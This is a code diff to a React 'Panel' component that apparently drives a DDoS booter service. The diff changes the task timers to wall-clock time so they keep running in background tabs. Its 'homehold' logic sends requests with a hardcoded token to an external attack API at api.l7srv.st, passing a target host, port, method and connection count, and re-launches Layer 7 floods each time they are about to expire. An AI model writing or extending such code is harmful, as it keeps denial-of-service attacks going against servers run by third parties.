@@ -61,46 +61,82 @@ export default function Panel() {
     homeholdRef.current = homehold;
   }, [homehold]);
 
+  // Helper to re-sync tasks based on wall-clock time (fixes background tab throttling)
+  const syncTasksWithTime = React.useCallback((prevTasks) => {
+    const now = Date.now();
+    const pad = (num) => String(num).padStart(2, '0');
+
+    const updated = prevTasks.map(task => {
+      const elapsed = Math.floor((now - task.startTimestamp) / 1000);
+      const remaining = task.time - elapsed;
+
+      if (remaining <= 0 && task.layer === 'L7' && homeholdRef.current) {
+        // Expired while in background — trigger homehold restart
+        const token = "8xU8xJvvT6nF16JOF5XNT8";
+        const req = task.reqMethod || 'GET';
+        const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(task.target)}&port=${task.port || '80'}&time=${task.time}&method=${task.method.toLowerCase()}&concs=${task.conns}&reqmethod=${req}`;
+        fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold restart hit failed", err));
+        const d = new Date();
+        return {
+          ...task,
+          timeLeft: task.time,
+          startTimestamp: now,
+          startedAt: `${pad(d.getMonth() + 1)}/${pad(d.getDate())}/${d.getFullYear()}, ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`
+        };
+      }
+
+      if (remaining <= 0) return null; // expired, remove
+      return { ...task, timeLeft: remaining };
+    }).filter(Boolean);
+
+    return updated;
+  }, []);
+
+  // Interval-based timer using wall-clock for accurate countdown
   useEffect(() => {
     if (activeTasks.length > 0) {
       const timer = setInterval(() => {
-        setActiveTasks(prevTasks => {
-          // If homehold is on, check if tasks are about to expire and trigger restart
-          prevTasks.forEach(task => {
-            if (task.timeLeft === 1 && task.layer === 'L7' && homeholdRef.current) {
-              // Trigger silent launch restart
+        setActiveTasks(prev => {
+          const now = Date.now();
+          const pad = (num) => String(num).padStart(2, '0');
+
+          return prev.map(task => {
+            const elapsed = Math.floor((now - task.startTimestamp) / 1000);
+            const remaining = task.time - elapsed;
+
+            if (remaining <= 1 && task.layer === 'L7' && homeholdRef.current) {
+              // About to expire with homehold ON — restart
               const token = "8xU8xJvvT6nF16JOF5XNT8";
               const req = task.reqMethod || 'GET';
               const apiUrl = `https://api.l7srv.st/attack?token=${token}&host=${encodeURIComponent(task.target)}&port=${task.port || '80'}&time=${task.time}&method=${task.method.toLowerCase()}&concs=${task.conns}&reqmethod=${req}`;
-              fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Auto-restart hit failed", err));
-            }
-          });
-
-          return prevTasks
-            .map(task => {
-              if (task.timeLeft === 1 && task.layer === 'L7' && homeholdRef.current) {
-                // If homehold restart is active, reset time left on the UI card
-                return {
-                  ...task,
-                  timeLeft: task.time,
-                  startedAt: (() => {
-                    const pad = (num) => String(num).padStart(2, '0');
-                    const d = new Date();
-                    return `${pad(d.getMonth() + 1)}/${pad(d.getDate())}/${d.getFullYear()}, ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
-                  })()
-                };
-              }
+              fetch(apiUrl, { mode: 'no-cors' }).catch(err => console.error("Homehold restart hit failed", err));
+              const d = new Date();
               return {
                 ...task,
-                timeLeft: task.timeLeft - 1
+                timeLeft: task.time,
+                startTimestamp: now,
+                startedAt: `${pad(d.getMonth() + 1)}/${pad(d.getDate())}/${d.getFullYear()}, ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`
               };
-            })
-            .filter(task => task.timeLeft > 0);
+            }
+
+            return { ...task, timeLeft: Math.max(0, remaining) };
+          }).filter(task => task.timeLeft > 0);
         });
       }, 1000);
       return () => clearInterval(timer);
     }
   }, [activeTasks.length]);
+
+  // Page Visibility API — sync timers when tab comes back to foreground
+  useEffect(() => {
+    const handleVisibilityChange = () => {
+      if (document.visibilityState === 'visible') {
+        setActiveTasks(prev => syncTasksWithTime(prev));
+      }
+    };
+    document.addEventListener('visibilitychange', handleVisibilityChange);
+    return () => document.removeEventListener('visibilitychange', handleVisibilityChange);
+  }, [syncTasksWithTime]);
 
   const formatTimeLeft = (seconds) => {
     const mins = Math.floor(seconds / 60);
@@ -179,14 +215,16 @@ export default function Panel() {
       const formattedDate = `${pad(d.getMonth() + 1)}/${pad(d.getDate())}/${d.getFullYear()}, ${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())}`;
 
       const newTasks = [];
+      const launchTime = Date.now();
       for (let i = 0; i < finalConns; i++) {
         newTasks.push({
-          id: `${Date.now()}-${i}-${Math.random()}`,
+          id: `${launchTime}-${i}-${Math.random()}`,
           target,
           method: method.toUpperCase(),
           port,
           time: finalDuration,
           timeLeft: finalDuration,
+          startTimestamp: launchTime, // absolute wall-clock for background sync
           conns: 1, // each simulated attack card shows x1
           layer,
           reqMethod: layer === 'L7' ? reqMethod : null,
